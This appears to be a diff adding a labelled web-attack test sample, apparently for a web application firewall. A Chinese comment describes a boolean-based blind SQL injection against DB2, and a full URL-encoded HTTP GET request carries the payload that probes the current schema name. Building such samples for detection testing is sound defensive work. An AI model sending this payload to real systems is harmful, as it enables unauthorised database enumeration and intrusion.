@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_布尔注入-06506481
+# 基于布尔注入，该SQL注入语句中："1 and (select ascii(substr(current schema,1,1)) from sysibm.sysdummy1 )>0"，攻击者尝试通过注入代码来检查当前数据库架构（schema）的第一个字符，并检查其ASCII值是否大于0。攻击者的目的是获取当前数据库架构（schema）的第一个字符。通过了解数据库架构，攻击者可以进一步了解数据库的结构和可能的弱点，从而进行后续的攻击，例如查找其他敏感信息、绕过权限控制或者执行其他恶意操作。
+GET /?id=1%20and%20%28select%20ascii%28substr%28current%20schema%2C1%2C1%29%29%20from%20sysibm.sysdummy1%20%29%3E0&bid=hd_tag_m8mv26l0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26l0
+RM-PRO-Token: 7b7f19b47e8e20c9ed31cdbfb9e1c896
+RM-PRO-Time: 1742808628799
+User-Agent: curl/7.83.1
+
